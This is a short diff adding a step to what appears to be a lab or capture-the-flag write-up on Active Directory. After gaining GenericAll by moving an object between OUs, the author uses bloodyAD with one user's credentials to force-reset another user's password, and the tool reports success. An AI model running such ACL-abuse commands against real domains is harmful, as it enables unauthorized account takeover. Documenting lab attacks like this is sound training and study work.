@@ -633,5 +633,12 @@ https://github.com/ethanbauer10/OU-move/
 I have now moved the object, which should now mean i have GenericAll over the object, which means i can change the user password
 
 ```python
+bloodyAD --host dc.hsm-defense.local -d hsm-defense.local -u caleb.turner -p '//newpassword123' -k set password 'CN=OSCAR.MAZERATH,OU=IT-TIER3,DC=HSM-DEFENSE,DC=LOCAL' 'Password123!'
+[+] Password changed successfully!
+```
+
+Ill then change the users password
+
+```python
 
 ```
